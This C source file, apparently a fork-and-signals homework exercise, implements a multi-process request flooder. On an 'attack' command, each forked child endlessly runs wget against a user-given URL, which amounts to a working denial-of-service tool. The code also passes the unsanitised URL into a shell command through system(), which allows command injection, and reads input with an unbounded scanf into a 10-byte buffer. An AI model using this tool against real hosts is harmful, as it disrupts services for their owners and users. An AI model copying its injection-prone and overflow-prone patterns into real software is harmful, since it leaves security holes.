#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>

int waittime;   // Global var to communicate wait time in ms
char url[1000]; // Global var to communicate url

// Catch all function that handles signals to stop and initiate attack
void signalHandler(int sig){
    if(sig==SIGUSR1){   // If attack signal
        while(1){   // Loop until new signal recieved
            printf("%d: sending request\n", getpid());  // Inform user that child is sending requests
            int ret = system(url);  // Make wget request to url
            if(ret !=0){    // If request fails, inform user and try again
                printf("Error %d... Check your url\n", ret);
            }
            usleep(waittime);   // Pause fo waittime ms
        }
    }else if(sig == SIGUSR2){   // If stop signal recieved
        exit(0);    // Exit
    }
}


int main(int argc, char** argv){
    if(argc != 4){  // Make sure user enters correct input
        printf("usage: ./hw11 N-procs maxSleepTime 'url'\n");   // Otherwise inform them
        exit(-1);
    }
    int num_children = atoi(argv[1]);  // Grab num children to be forked 
    int child_pids[num_children];   // Array to hold children pid's
    int ret;  
    waittime = atoi(argv[2]) * 1000;    // Get waittime in ms and adjust to us
    char in_buff[10];   // Input buffer(should never be greater than 7 characters

    sprintf(url, "wget -q -O - -o /dev/null %s > /dev/null", argv[3]);  // Build system command

    signal(SIGUSR1, signalHandler); // Assign signals
    signal(SIGUSR2, signalHandler);
     
    for(int i=0; i<num_children; i++){  // Fork children
        ret = fork();
        if(ret==0){ // Pause if child and wait for signal
            pause();
        }else{
            child_pids[i] = ret;    // Add forked child's pid to array if parent 
        }
    }

    // User input loop
    if(ret !=0){
        while(1){   // Loop until stop command given
            printf("UNIX> ");   // Display prompt
            scanf("%s", in_buff);   // Get user in
            if(strcmp(in_buff, "stop") == 0){   // If stop:
                for(int i=0; i<num_children; i++){  // Send stop signal to each child
                    kill(child_pids[i], SIGUSR2);
                }
                return 0;   // And end program
            }else if(strcmp(in_buff, "attack")==0){ // If attack:
                for(int i=0; i<num_children; i++){  // Send attack signal to each child
                    kill(child_pids[i], SIGUSR1);
                }
            }else{  
                printf("Unknown command...\n"); // Otherwise inform user of bad command
            }
        }
    }
}

